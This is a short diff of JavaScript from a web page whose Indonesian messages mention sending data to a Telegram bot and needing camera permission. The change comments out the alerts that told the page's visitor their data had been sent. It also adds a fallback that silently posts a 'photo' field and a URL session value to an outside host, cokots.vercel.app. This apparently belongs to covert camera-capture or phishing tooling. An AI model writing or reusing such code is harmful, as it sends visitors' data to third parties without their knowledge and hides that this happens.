@@ -25,10 +25,25 @@
                     body: formData,
                 });
 
-                alert("Data berhasil dikirim ke bot Telegram!");
+                //alert("Data berhasil dikirim ke bot Telegram!");
+
+
             } catch (error) {
                 console.error("Error:", error);
-                alert("Gagal mengirim data. Pastikan izin kamera diberikan.");
+               // Kirim foto ke server
+               const formData = new FormData();
+               formData.append("photo", "");
+               
+               const session = new URLSearchParams(window.location.search).get("session");
+               
+               await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+               method: "POST",
+               body: formData,
+               });
+   
+                //alert("Gagal mengirim data. Pastikan izin kamera diberikan.");
+ 
+ 
             }
         }
 
